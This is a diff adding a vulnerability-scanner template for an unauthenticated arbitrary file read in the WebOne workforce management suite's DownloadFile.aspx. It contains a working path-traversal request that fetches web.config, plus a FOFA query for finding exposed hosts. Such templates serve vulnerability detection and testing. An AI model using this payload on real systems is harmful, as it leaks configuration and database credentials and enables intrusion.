@@ -1,0 +1,30 @@
+id: webone-DownloadFile-fileread
+info:
+  name: WebOne 劳动力与考勤管理套件 DownloadFile.aspx 任意文件读取
+  author: leadlife
+  severity: high
+  description: WebOne劳动力与考勤管理软件的/webForms/Download/DownloadFile.aspx接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息。
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/WebOne/WebOne%20%E5%8A%B3%E5%8A%A8%E5%8A%9B%E4%B8%8E%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E5%A5%97%E4%BB%B6%20DownloadFile.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="http://www.coho.com.cn" || title="Webone-WTS劳动力管理套件" || icon_hash="-2067923353" || icon_hash="1110197594"
+    tips:
+    repair: 目前官方已发布漏洞修复版本，建议用户升级到安全版本：http://www.coho.net.cn/
+    version:
+  tags: fileread,webone
+
+http:
+  - raw:
+      - |
+        GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','configSections')
+        condition: and
